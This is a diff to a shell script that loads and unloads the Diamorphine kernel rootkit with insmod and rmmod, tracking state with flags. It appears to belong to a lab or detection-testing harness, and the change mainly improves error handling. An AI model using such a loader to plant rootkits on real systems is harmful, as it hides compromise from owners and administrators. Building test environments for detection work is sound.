@@ -1,17 +1,26 @@
 # Diamorphine kernel module
 install_rootkit() {
     echo "[*] Installing rootkit (Diamorphine)..."
-    if [ -f "$ASSETS_DIR/diamorphine.ko" ]; then
-        insmod "$ASSETS_DIR/diamorphine.ko" 2>/dev/null && \
-            echo "[+] Diamorphine loaded" || echo "[-] insmod failed"
-    else
-        echo "[-] diamorphine.ko not found at $ASSETS_DIR/diamorphine.ko"
+    if [ ! -f "$ASSETS_DIR/diamorphine.ko" ]; then
+        echo "[-] diamorphine.ko not found"
+        return 1
     fi
-    set_flag "rootkit"
+    if insmod "$ASSETS_DIR/diamorphine.ko" 2>&1; then
+        echo "[+] Diamorphine loaded"
+        set_flag "rootkit"
+    else
+        echo "[-] insmod failed"
+        return 1
+    fi
 }
 
 clean_rootkit() {
     echo "[*] Cleaning rootkit..."
-    rmmod diamorphine 2>/dev/null && echo "[+] Diamorphine unloaded" || true
+    if rmmod diamorphine 2>&1; then
+        echo "[+] Diamorphine unloaded"
+    else
+        echo "[!] rmmod failed — module may still be loaded"
+        return 1
+    fi
     clear_flag "rootkit"
 }
